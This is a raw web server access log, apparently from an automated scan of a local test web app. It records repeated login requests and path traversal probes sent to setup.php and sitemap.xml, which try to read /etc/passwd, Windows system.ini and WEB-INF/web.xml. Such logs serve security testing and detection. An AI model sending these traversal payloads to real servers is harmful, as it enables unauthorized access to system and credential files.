172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /setup.php?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /setup.php?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 200 4447 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:12 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4478 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1895 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1895 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php?query=%2Fetc%2Fpasswd HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php?query=c%3A%2F HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php?query=%2F HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php?query=c%3A%5C HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php?query=WEB-INF%2Fweb.xml HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php?query=WEB-INF%5Cweb.xml HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php?query=%2FWEB-INF%2Fweb.xml HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php?query=%5CWEB-INF%5Cweb.xml HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php?query=thishouldnotexistandhopefullyitwillnot HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /sitemap.xml?query=c%3A%2FWindows%2Fsystem.ini HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /sitemap.xml?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /sitemap.xml?query=c%3A%5CWindows%5Csystem.ini HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /sitemap.xml?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:13 +0000] "GET /sitemap.xml?query=%2Fetc%2Fpasswd HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
